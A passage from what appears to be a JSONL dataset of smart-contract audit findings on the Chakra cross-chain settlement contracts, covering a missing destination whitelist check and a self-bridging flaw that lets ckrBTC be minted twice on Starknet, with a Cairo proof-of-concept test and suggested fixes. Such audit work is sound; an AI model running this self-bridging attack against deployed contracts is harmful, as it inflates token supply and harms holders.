_erc20_burn(msg.sender, amount);\n    }\n    ...\n}\n```\n\n\n## Assessed type\n\nInvalid Validation\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/handler/contracts/ChakraSettlementHandler.sol#L120\n\n\n# Vulnerability details\n\n## Impact\n\nThe handler does not prevent tokens from being sent to incorrect chains and handlers. If a message is sent to an incorrect handler, the failure cannot be handled through `receive_cross_chain_callback`.\n\n## Proof of Concept\n\n`Handler.cross_chain_erc20_settlement` does not check if `to_chain` and `to_handler` are whitelisted. Therefore, it's possible to send messages to any chains and handlers that arent paired with this handler.\n\n```solidity\nfunction cross_chain_erc20_settlement(\n    string memory to_chain,\n    uint256 to_handler,\n    uint256 to_token,\n    uint256 to,\n    uint256 amount\n) external {\n    require(amount > 0, \"Amount must be greater than 0\");\n    require(to != 0, \"Invalid to address\");\n@>  require(to_handler != 0, \"Invalid to handler address\");\n    require(to_token != 0, \"Invalid to token address\");\n\n    if (mode == SettlementMode.MintBurn) {\n        _erc20_lock(msg.sender, address(this), amount);\n    } else if (mode == SettlementMode.LockUnlock) {\n        _erc20_lock(msg.sender, address(this), amount);\n    } else if (mode == SettlementMode.LockMint) {\n        _erc20_lock(msg.sender, address(this), amount);\n    } else if (mode == SettlementMode.BurnUnlock) {\n        _erc20_burn(msg.sender, amount);\n    }\n    ...\n}\n```\n\nIf a non-contract address is set as `to_handler`, the transaction will revert when trying to call `Handler.receive_cross_chain_msg` on the destination chain. As a result, it's impossible to emit an event to signal the failure, making failure handling impossible.\n\n```solidity\n// Settlement.receive_cross_chain_msg\nfunction receive_cross_chain_msg(\n    uint256 txid,\n    string memory from_chain,\n    uint256 from_address,\n    uint256 from_handler,\n    address to_handler,\n    PayloadType payload_type,\n    bytes calldata payload,\n    uint8 sign_type, // validators signature type /  multisig or bls sr25519\n    bytes calldata signatures // signature array\n) external {\n    ...\n\n@>  bool result = ISettlementHandler(to_handler).receive_cross_chain_msg( // this will be reverted\n        txid,\n        from_chain,\n        from_address,\n        from_handler,\n        payload_type,\n        payload,\n        sign_type,\n        signatures\n    );\n  \n    CrossChainMsgStatus status = CrossChainMsgStatus.Failed;\n    if (result == true) {\n        status = CrossChainMsgStatus.Success;\n        receive_cross_txs[txid].status = CrossChainMsgStatus.Success;\n    } else {\n@>      receive_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n    }\n\n    emit CrossChainHandleResult(\n        txid,\n@>      status,\n        contract_chain_name,\n        from_chain,\n        address(to_handler),\n        from_handler,\n        payload_type\n    );\n}\n```\n\nThere's another problem. If a non-whitelisted handler requests a message, `Handler.receive_cross_chain_msg` will return `false` to indicate failure. Validators listen for the `CrossChainHandleResult` event to notify the source chain of the failure through `receive_cross_chain_callback`, allowing the handler to process the failure.\n\n```solidity\nfunction receive_cross_chain_msg(\n    uint256 /**txid */,\n    string memory from_chain,\n    uint256 /**from_address */,\n    uint256 from_handler,\n    PayloadType payload_type,\n    bytes calldata payload,\n    uint8 /**sign type */,\n    bytes calldata /**signaturs */\n) external onlySettlement returns (bool) {\n    //  from_handler need in whitelist\n@>  if (is_valid_handler(from_chain, from_handler) == false) {\n@>      return false;\n    }\n    ...\n}\n```\n\nHowever, `Handler.receive_cross_chain_callback` only allows callback messages from whitelisted chains and handlers. This means that when a message is sent to an incorrect handler and fails, the callback notifies of the failure, but the source chain's handler ignores and cannot handle the failure caused by the incorrect handler.\n\n```solidity\nfunction receive_cross_chain_callback(\n    uint256 txid,\n    string memory from_chain,\n    uint256 from_handler,\n    CrossChainMsgStatus status,\n    uint8 /* sign_type */, // validators signature type /  multisig or bls sr25519\n    bytes calldata /* signatures */\n) external onlySettlement returns (bool) {\n    //  from_handler need in whitelist\n@>  if (is_valid_handler(from_chain, from_handler) == false) {\n@>      return false;\n    }\n\n    require(\n        create_cross_txs[txid].status == CrossChainTxStatus.Pending,\n        \"invalid CrossChainTxStatus\"\n    );\n\n    if (status == CrossChainMsgStatus.Success) {\n        if (mode == SettlementMode.MintBurn) {\n            _erc20_burn(address(this), create_cross_txs[txid].amount);\n        }\n\n        create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n    }\n\n    if (status == CrossChainMsgStatus.Failed) {\n        create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n    }\n\n    return true;\n}\n```\n\nTherefore, `Handler.cross_chain_erc20_settlement` should check that `to_chain` and `to_handler` are whitelisted to prevent message transmission to incorrect handlers in the first place.\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\n```diff\nfunction cross_chain_erc20_settlement(\n    string memory to_chain,\n    uint256 to_handler,\n    uint256 to_token,\n    uint256 to,\n    uint256 amount\n) external {\n    require(amount > 0, \"Amount must be greater than 0\");\n    require(to != 0, \"Invalid to address\");\n    require(to_handler != 0, \"Invalid to handler address\");\n    require(to_token != 0, \"Invalid to token address\");\n+   require(is_valid_handler(to_chain, to_handler), \"not valid destination\");\n\n    if (mode == SettlementMode.MintBurn) {\n        _erc20_lock(msg.sender, address(this), amount);\n    } else if (mode == SettlementMode.LockUnlock) {\n        _erc20_lock(msg.sender, address(this), amount);\n    } else if (mode == SettlementMode.LockMint) {\n        _erc20_lock(msg.sender, address(this), amount);\n    } else if (mode == SettlementMode.BurnUnlock) {\n        _erc20_burn(msg.sender, amount);\n    }\n    ...\n}\n```\n\n\n## Assessed type\n\nInvalid Validation"}, "severity": "Medium", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "Medium"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-046", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 46, "page_start": null, "title": "Bridging from Starknet to Starknet causes mismatch between minted ckrBTC and BTC transferred to MuSig2", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L115\n\n\n# Vulnerability details\n\n## Impact\nIt is possible to bridge assets from Starknet to Starknet by setting `to_chain` and `to_handler` to be the same as `from_chain` and `from_handler`. This violates the core rule of the protocol, which is \"The contract maintains a consistent state between locking/burning tokens on the source chain and minting/unlocking on the destination chain, depending on the settlement mode.\"\n\nFor example, this could result in the total supply of `ckrBTC` on Starknet being higher than the amount of BTC transferred to MuSig2 on the Bitcoin network.\n\n## Proof of Concept\nWhen a message is received on Starknet, the `handler_erc20::receive_cross_chain_msg` function is called:\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L108)\n\nIn this function, it checks that both `to_chain` and `to_handler` as well as `from_chain` and `from_handler` are supported:\n```rust\nassert(self.support_handler.read((from_chain, from_handler)) &&\n       self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n```\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L115)\n\n`to_chain` must be the Starknet chain name, and `to_handler` must be the contract address of `handler_erc20`.\n\nThis check forces the owner to already call `set_support_handler` to add support for `to_chain` and `to_handler`. Otherwise, any call to `handler_erc20::receive_cross_chain_msg` will fail:\n```rust\nfn set_support_handler(ref self: ContractState, chain_name: felt252, handler: u256, support: bool) {\n    self.ownable.assert_only_owner();\n    self.support_handler.write((chain_name, handler), support);\n}\n```\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L238)\n\nAt first glance, this seems redundant. Why should the Starknet chain and its handler be added to the `support_handler` mapping within the same handler? For example, if the chain name is `Starknet` and the handler address is `0xaa`, calling `support_handler.read('Starknet', 0xaa)` returns `1`. This mapping should only record valid destination chains and handler addresses, not its own chain and handler.\n\nThis creates a potential attack:\n1. The attacker sends a cross-chain message from Starknet and `handler_erc20` to the same chain and handler. This means the source chain equals the destination chain, and the source handler equals the destination handler. The parameters for `handler_erc20::cross_chain_erc20_settlement` would be:\n   - `to_chain`: Starknet\n   - `to_handler`: the same address as `handler_erc20`\n   - `to_token`: the same token address (`ckrBTC`)\n   - `to`: the recipient address (irrelevant for this vulnerability)\n   - `amount`: the token amount (irrelevant for this vulnerability)\n2. During the bridging process, there is no check that `to_chain` and `to_handler` are different from `from_chain` and `from_handler`.\n3. Once the validators sign the event (the validator implementation is out of scope), the message is received on Starknet, and `settlement::receive_cross_chain_msg` is called. This function does not prevent the attack.\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L325)\n4. Then, `receive_cross_chain_msg::handler_erc20` is called:\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L354)\n5. This function checks if `to_chain` and `to_handler` are supported, and since `to_chain = from_chain` and `to_handler = from_handler`, it passes.\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L114)\n6. Finally, the transfer or mint occurs. If the settlement mode is `LockMint`, the same amount of `ckrBTC` that was locked on Starknet will be minted on Starknet again. In other words, because the source and destination are the same, the locked token on the source is minted again on the same source. For example, if the attacker bridges 1000 `ckrBTC` from Starknet to Starknet, 1000 `ckrBTC` is locked on Starknet, and then 1000 `ckrBTC` is minted again, resulting in a total supply increase of 2000 `ckrBTC` on Starknet (1000 locked and 1000 minted).\n\nThis contradicts the core logic of the protocol, as explained:\n> \"In Chakra liquid staking, users first transfer Bitcoin to a multi-signature address supported by MuSig2. This event is captured by the indexer, which calls the on-chain contract to mint ckrBTC for the user. The Bitcoin in the multi-signature address is staked into Babylon. While holding ckrBTC, users continue to earn rewards from Babylon staking. When users want to end the staking, they can burn ckrBTC.\"\n[Link to source](https://blog.bitlayer.org/BIP-327_MuSig2_in_Four_Applications/)\n\n**This means that the amount of `ckrBTC` on Starknet is supposed to match the amount of BTC transferred to MuSig2. However, due to this attack, the amount of `ckrBTC` on Starknet can be maliciously increased and will not match the amount of BTC transferred to MuSig2.**\n\n### Summary:\nUnder normal conditions, a user locks `ckrBTC` on Starknet and receives tokens on another chain, enabling them to use Bitcoin-backed assets in DeFi protocols. But in this attack, the attacker locks `ckrBTC` on Starknet and bridges it to Starknet again to mint `ckrBTC` again. This causes the total supply of `ckrBTC` on Starknet to be higher than the amount of BTC in MuSig2, violating the core rule of the protocol.\n\n### Note:\nThis vulnerability does not depend on owner mistakes. The owner must have already added the source chain and handler to the `support_handler` mapping; otherwise, any call to `handler_erc20::receive_cross_chain_msg` would fail. On the EVM-based code, however, the owner does not need to add the source chain and handler to the `handler_whitelist` mapping, since `ChakraSettlementHandler::receive_cross_chain_msg` only checks that `from_chain` and `from_handler` are whitelisted, not `to_chain` and `to_handler`.\n```solidity\nif (is_valid_handler(from_chain, from_handler) == false) {\n    return false;\n}\n```\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L311)\n\n### Proof of Concept (PoC)\nIn the following test, `target_chain`, `target_token`, and `target_handler` are all set to `Starknet`, `ckrBTC`, and `erc20_handler` on Starknet, respectively. This shows that the transaction executes successfully, contrary to expectations.\n\n```javascript\nuse core::option::OptionTrait;\nuse core::traits::TryInto;\nuse settlement_cairo::ckr_btc::IckrBTCDispatcherTrait;\nuse openzeppelin::token::erc20::interface::IERC20DispatcherTrait;\nuse core::result::ResultTrait;\nuse core::box::BoxTrait;\nuse snforge_std::{declare, ContractClassTrait, start_prank, CheatTarget, stop_prank};\nuse starknet::ContractAddress;\nuse starknet::{get_tx_info, get_caller_address};\nuse settlement_cairo::interfaces::{IERC20HandlerDispatcher, IERC20HandlerDispatcherTrait, IChakraSettlementDispatcher, IChakraSettlementDispatcherTrait};\nuse settlement_cairo::codec::{decode_transfer, encode_transfer, ERC20Transfer, Message, decode_message, encode_message};\nuse settlement_cairo::utils::{u256_to_contract_address, contract_address_to_u256, u256_to_u8_array};\nuse settlement_cairo::ckr_btc::{IckrBTCDispatcher};\nuse openzeppelin::token::erc20::interface::IERC20Dispatcher;\n\n\n#[test]\nfn test_lock_mint_self(){\n    let source_chain = 'Starknet';\n    let target_address = 1;\n    let amount = 1000;\n    let owner_address = 0x5a9bd6214db5b229bd17a4050585b21c87fc0cadf9871f89a099d27ef800a40;\n    let attacker_address = 0x00112233445566778899aabbccddeeff;\n    let attacker = attacker_address.try_into().unwrap();\n\n\n    let settlement_contract = declare(\"ChakraSettlement\");\n    let settlement_address = settlement_contract.deploy(@array![owner_address, 1]).unwrap();\n    let ckrBTC_contract = declare(\"ckrBTC\");\n    let ckrBTC_address = ckrBTC_contract.deploy(@array![owner_address]).unwrap();\n    let erc20_handler = declare(\"ERC20Handler\");\n    let erc20_handler_address = erc20_handler.deploy(@array![settlement_address.into(),owner_address,ckrBTC_address.into(), 1]).unwrap();\n\n\n    let handler_dispath = IERC20HandlerDispatcher {contract_address: erc20_handler_address};\n    let ckrbtc_dispath = IckrBTCDispatcher{contract_address: ckrBTC_address};\n    let ckrbtc_erc20_dispath = IERC20Dispatcher{contract_address: ckrBTC_address};\n    // support handler\n    let owner = owner_address.try_into().unwrap();\n    start_prank(CheatTarget::One(erc20_handler_address), owner);\n    // add from_chain from_handler\n    handler_dispath.set_support_handler(source_chain, contract_address_to_u256(erc20_handler_address),true);\n\n    start_prank(CheatTarget::One(ckrBTC_address), owner);\n    ckrbtc_dispath.add_operator(erc20_handler_address);\n    ckrbtc_dispath.add_operator(owner);\n    // cross_chain_erc20_settlement\n    ckrbtc_dispath.mint_to(attacker, amount);\n    stop_prank(CheatTarget::One(ckrBTC_address));\n\n\n    ////////////// attack starts here\n    start_prank(CheatTarget::One(ckrBTC_address), attacker);\n    ckrbtc_erc20_dispath.approve(erc20_handler_address, amount);\n    stop_prank(CheatTarget::One(ckrBTC_address));\n\n    start_prank(CheatTarget::One(erc20_handler_address), attacker);\n    let target_chain = 'Starknet'; // attacker sets the target chain as source chain\n    let target_token = contract_address_to_u256(ckrBTC_address); // attacker sets the target token as source token\n    let target_handler = contract_address_to_u256(erc20_handler_address); // attacker sets the target handler as source handler\n    handler_dispath.cross_chain_erc20_settlement(target_chain, target_handler, target_token, target_address, amount);\n    stop_prank(CheatTarget::One(erc20_handler_address));\n\n    assert(ckrbtc_erc20_dispath.balance_of(attacker) == 0, 'balance error after cross');\n    assert(ckrbtc_erc20_dispath.balance_of(erc20_handler_address) == amount, 'handler balance error');\n\n    // receive_cross_chain_msg\n    start_prank(CheatTarget::One(erc20_handler_address), settlement_address);\n\n    assert(ckrbtc_erc20_dispath.balance_of(u256_to_contract_address(0x70997970c51812dc3a010c7d01b50e0d17dc79c8)) == 0, 'to_address balance error');\n    let message_array_u8 = array! [1, 226, 26, 80, 2, 232, 11, 172, 207, 254, 0, 95, 72, 69, 136, 99, 38, 6, 228, 108, 177, 62, 5, 10, 125, 58, 52, 32, 110, 139, 85, 224, 141, 5, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 243, 159, 214, 229, 26, 173, 136, 246, 244, 206, 106, 184, 130, 114, 121, 207, 255, 185, 34, 102, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 112, 153, 121, 112, 197, 24, 18, 220, 58, 1, 12, 125, 1, 181, 14, 13, 23, 220, 121, 200, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 231, 241, 114, 94, 119, 52, 206, 40, 143, 131, 103, 225, 187, 20, 62, 144, 187, 63, 5, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 144, 247, 155, 246, 235, 44, 79, 135, 3, 101, 231, 133, 152, 46, 31, 16, 30, 147, 185, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 232];\n    handler_dispath.receive_cross_chain_msg(1, target_chain, source_chain, target_handler, erc20_handler_address, message_array_u8);\n    assert(ckrbtc_erc20_dispath.balance_of(u256_to_contract_address(0x70997970c51812dc3a010c7d01b50e0d17dc79c8)) == 1000, 'transfer error');\n}\n```\n\n## Tools Used\n\n## Recommended Mitigation Steps\nWhen bridging from Starknet, it should ensure that the source and destination are different.\n\n\n## Assessed type\n\nContext\n", "sections": {"description_md": null, "impact_md": "## Impact\nIt is possible to bridge assets from Starknet to Starknet by setting `to_chain` and `to_handler` to be the same as `from_chain` and `from_handler`. This violates the core rule of the protocol, which is \"The contract maintains a consistent state between locking/burning tokens on the source chain and minting/unlocking on the destination chain, depending on the settlement mode.\"\n\nFor example, this could result in the total supply of `ckrBTC` on Starknet being higher than the amount of BTC transferred to MuSig2 on the Bitcoin network.\n", "recommendation_md": "## Recommended Mitigation Steps\nWhen bridging from Starknet, it should ensure that the source and destination are different.\n\n\n## Assessed type\n\nContext\n", "poc_md": "## Proof of Concept\nWhen a message is received on Starknet, the `handler_erc20::receive_cross_chain_msg` function is called:\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L108)\n\nIn this function, it checks that both `to_chain` and `to_handler` as well as `from_chain` and `from_handler` are supported:\n```rust\nassert(self.support_handler.read((from_chain, from_handler)) &&\n       self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n```\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L115)\n\n`to_chain` must be the Starknet chain name, and `to_handler` must be the contract address of `handler_erc20`.\n\nThis check forces the owner to already call `set_support_handler` to add support for `to_chain` and `to_handler`. Otherwise, any call to `handler_erc20::receive_cross_chain_msg` will fail:\n```rust\nfn set_support_handler(ref self: ContractState, chain_name: felt252, handler: u256, support: bool) {\n    self.ownable.assert_only_owner();\n    self.support_handler.write((chain_name, handler), support);\n}\n```\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L238)\n\nAt first glance, this seems redundant. Why should the Starknet chain and its handler be added to the `support_handler` mapping within the same handler? For example, if the chain name is `Starknet` and the handler address is `0xaa`, calling `support_handler.read('Starknet', 0xaa)` returns `1`. This mapping should only record valid destination chains and handler addresses, not its own chain and handler.\n\nThis creates a potential attack:\n1. The attacker sends a cross-chain message from Starknet and `handler_erc20` to the same chain and handler. This means the source chain equals the destination chain, and the source handler equals the destination handler. The parameters for `handler_erc20::cross_chain_erc20_settlement` would be:\n   - `to_chain`: Starknet\n   - `to_handler`: the same address as `handler_erc20`\n   - `to_token`: the same token address (`ckrBTC`)\n   - `to`: the recipient address (irrelevant for this vulnerability)\n   - `amount`: the token amount (irrelevant for this vulnerability)\n2. During the bridging process, there is no check that `to_chain` and `to_handler` are different from `from_chain` and `from_handler`.\n3. Once the validators sign the event (the validator implementation is out of scope), the message is received on Starknet, and `settlement::receive_cross_chain_msg` is called. This function does not prevent the attack.\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L325)\n4. Then, `receive_cross_chain_msg::handler_erc20` is called:\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L354)\n5. This function checks if `to_chain` and `to_handler` are supported, and since `to_chain = from_chain` and `to_handler = from_handler`, it passes.\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L114)\n6. Finally, the transfer or mint occurs. If the settlement mode is `LockMint`, the same amount of `ckrBTC` that was locked on Starknet will be minted on Starknet again. In other words, because the source and destination are the same, the locked token on the source is minted again on the same source. For example, if the attacker bridges 1000 `ckrBTC` from Starknet to Starknet, 1000 `ckrBTC` is locked on Starknet, and then 1000 `ckrBTC` is minted again, resulting in a total supply increase of 2000 `ckrBTC` on Starknet (1000 locked and 1000 minted).\n\nThis contradicts the core logic of the protocol, as explained:\n> \"In Chakra liquid staking, users first transfer Bitcoin to a multi-signature address supported by MuSig2. This event is captured by the indexer, which calls the on-chain contract to mint ckrBTC for the user. The Bitcoin in the multi-signature address is staked into Babylon. While holding ckrBTC, users continue to earn rewards from Babylon staking. When users want to end the staking, they can burn ckrBTC.\"\n[Link to source](https://blog.bitlayer.org/BIP-327_MuSig2_in_Four_Applications/)\n\n**This means that the amount of `ckrBTC` on Starknet is supposed to match the amount of BTC transferred to MuSig2. However, due to this attack, the amount of `ckrBTC` on Starknet can be maliciously increased and will not match the amount of BTC transferred to MuSig2.**\n\n### Summary:\nUnder normal conditions, a user locks `ckrBTC` on Starknet and receives tokens on another chain, enabling them to use Bitcoin-backed assets in DeFi protocols. But in this attack, the attacker locks `ckrBTC` on Starknet and bridges it to Starknet again to mint `ckrBTC` again. This causes the total supply of `ckrBTC` on Starknet to be higher than the amount of BTC in MuSig2, violating the core rule of the protocol.\n\n### Note:\nThis vulnerability does not depend on owner mistakes. The owner must have already added the source chain and handler to the `support_handler` mapping; otherwise, any call to `handler_erc20::receive_cross_chain_msg` would fail. On the EVM-based code, however, the owner does not need to add the source chain and handler to the `handler_whitelist` mapping, since `ChakraSettlementHandler::receive_cross_chain_msg` only checks that `from_chain` and `from_handler` are whitelisted, not `to_chain` and `to_handler`.\n```solidity\nif (is_valid_handler(from_chain, from_handler) == false) {\n    return false;\n}\n```\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L311)\n\n### Proof of Concept (PoC)\nIn the following test, `target_chain`, `target_token`, and `target_handler` are all set to `Starknet`, `ckrBTC`, and `erc20_handler` on Starknet, respectively. This shows that the transaction executes successfully, contrary to expectations.\n\n```javascript\nuse core::option::OptionTrait;\nuse core::traits::TryInto;\nuse settlement_cairo::ckr_btc::IckrBTCDispatcherTrait;\nuse openzeppelin::token::erc20::interface::IERC20DispatcherTrait;\nuse core::result::ResultTrait;\nuse core::box::BoxTrait;\nuse snforge_std::{declare, ContractClassTrait, start_prank, CheatTarget, stop_prank};\nuse starknet::ContractAddress;\nuse starknet::{get_tx_info, get_caller_address};\nuse settlement_cairo::interfaces::{IERC20HandlerDispatcher, IERC20HandlerDispatcherTrait, IChakraSettlementDispatcher, IChakraSettlementDispatcherTrait};\nuse settlement_cairo::codec::{decode_transfer, encode_transfer, ERC20Transfer, Message, decode_message, encode_message};\nuse settlement_cairo::utils::{u256_to_contract_address, contract_address_to_u256, u256_to_u8_array};\nuse settlement_cairo::ckr_btc::{IckrBTCDispatcher};\nuse openzeppelin::token::erc20::interface::IERC20Dispatcher;\n\n\n#[test]\nfn test_lock_mint_self(){\n    let source_chain = 'Starknet';\n    let target_address = 1;\n    let amount = 1000;\n    let owner_address = 0x5a9bd6214db5b229bd17a4050585b21c87fc0cadf9871f89a099d27ef800a40;\n    let attacker_address = 0x00112233445566778899aabbccddeeff;\n    let attacker = attacker_address.try_into().unwrap();\n\n\n    let settlement_contract = declare(\"ChakraSettlement\");\n    let settlement_address = settlement_contract.deploy(@array![owner_address, 1]).unwrap();\n    let ckrBTC_contract = declare(\"ckrBTC\");\n    let ckrBTC_address = ckrBTC_contract.deploy(@array![owner_address]).unwrap();\n    let erc20_handler = declare(\"ERC20Handler\");\n    let erc20_handler_address = erc20_handler.deploy(@array![settlement_address.into(),owner_address,ckrBTC_address.into(), 1]).unwrap();\n\n\n    let handler_dispath = IERC20HandlerDispatcher {contract_address: erc20_handler_address};\n    let ckrbtc_dispath = IckrBTCDispatcher{contract_address: ckrBTC_address};\n    let ckrbtc_erc20_dispath = IERC20Dispatcher{contract_address: ckrBTC_address};\n    // support handler\n    let owner = owner_address.try_into().unwrap();\n    start_prank(CheatTarget::One(erc20_handler_address), owner);\n    // add from_chain from_handler\n    handler_dispath.set_support_handler(source_chain, contract_address_to_u256(erc20_handler_address),true);\n\n    start_prank(CheatTarget::One(ckrBTC_address), owner);\n    ckrbtc_dispath.add_operator(erc20_handler_address);\n    ckrbtc_dispath.add_operator(owner);\n    // cross_chain_erc20_settlement\n    ckrbtc_dispath.mint_to(attacker, amount);\n    stop_prank(CheatTarget::One(ckrBTC_address));\n\n\n    ////////////// attack starts here\n    start_prank(CheatTarget::One(ckrBTC_address), attacker);\n    ckrbtc_erc20_dispath.approve(erc20_handler_address, amount);\n    stop_prank(CheatTarget::One(ckrBTC_address));\n\n    start_prank(CheatTarget::One(erc20_handler_address), attacker);\n    let target_chain = 'Starknet'; // attacker sets the target chain as source chain\n    let target_token = contract_address_to_u256(ckrBTC_address); // attacker sets the target token as source token\n    let target_handler = contract_address_to_u256(erc20_handler_address); // attacker sets the target handler as source handler\n    handler_dispath.cross_chain_erc20_settlement(target_chain, target_handler, target_token, target_address, amount);\n    stop_prank(CheatTarget::One(erc20_handler_address));\n\n    assert(ckrbtc_erc20_dispath.balance_of(attacker) == 0, 'balance error after cross');\n    assert(ckrbtc_erc20_dispath.balance_of(erc20_handler_address) == amount, 'handler balance error');\n\n    // receive_cross_chain_msg\n    start_prank(CheatTarget::One(erc20_handler_address), settlement_address);\n\n    assert(ckrbtc_erc20_dispath.balance_of(u256_to_contract_address(0x70997970c51812dc3a010c7d01b50e0d17dc79c8)) == 0, 'to_address balance error');\n    let message_array_u8 = array! [1, 226, 26, 80, 2, 232, 11, 172, 207, 254, 0, 95, 72, 69, 136, 99, 38, 6, 228, 108, 177, 62, 5, 10, 125, 58, 52, 32, 110, 139, 85, 224, 141, 5, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 243, 159, 214, 229, 26, 173, 136, 246, 244, 206, 106, 184, 130, 114, 121, 207, 255, 185, 34, 102, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 112, 153, 121, 112, 197, 24, 18, 220, 58, 1, 12, 125, 1, 181, 14, 13, 23, 220, 121, 200, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 231, 241, 114, 94, 119, 52, 206, 40, 143, 131, 103, 225, 187, 20, 62, 144, 187, 63, 5, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 144, 247, 155, 246, 235, 44, 79, 135, 3, 101, 231, 133, 152, 46, 31, 16, 30, 147, 185, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 232];\n    handler_dispath.receive_cross_chain_msg(1, target_chain, source_chain, target_handler, erc20_handler_address, message_array_u8);\n    assert(ckrbtc_erc20_dispath.balance_of(u256_to_contract_address(0x70997970c51812dc3a010c7d01b50e0d17dc79c8)) == 1000, 'transfer error');\n}\n```\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L115\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L115\n\n\n# Vulnerability details\n\n## Impact\nIt is possible to bridge assets from Starknet to Starknet by setting `to_chain` and `to_handler` to be the same as `from_chain` and `from_handler`. This violates the core rule of the protocol, which is \"The contract maintains a consistent state between locking/burning tokens on the source chain and minting/unlocking on the destination chain, depending on the settlement mode.\"\n\nFor example, this could result in the total supply of `ckrBTC` on Starknet being higher than the amount of BTC transferred to MuSig2 on the Bitcoin network.\n\n## Proof of Concept\nWhen a message is received on Starknet, the `handler_erc20::receive_cross_chain_msg` function is called:\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L108)\n\nIn this function, it checks that both `to_chain` and `to_handler` as well as `from_chain` and `from_handler` are supported:\n```rust\nassert(self.support_handler.read((from_chain, from_handler)) &&\n       self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n```\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L115)\n\n`to_chain` must be the Starknet chain name, and `to_handler` must be the contract address of `handler_erc20`.\n\nThis check forces the owner to already call `set_support_handler` to add support for `to_chain` and `to_handler`. Otherwise, any call to `handler_erc20::receive_cross_chain_msg` will fail:\n```rust\nfn set_support_handler(ref self: ContractState, chain_name: felt252, handler: u256, support: bool) {\n    self.ownable.assert_only_owner();\n    self.support_handler.write((chain_name, handler), support);\n}\n```\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L238)\n\nAt first glance, this seems redundant. Why should the Starknet chain and its handler be added to the `support_handler` mapping within the same handler? For example, if the chain name is `Starknet` and the handler address is `0xaa`, calling `support_handler.read('Starknet', 0xaa)` returns `1`. This mapping should only record valid destination chains and handler addresses, not its own chain 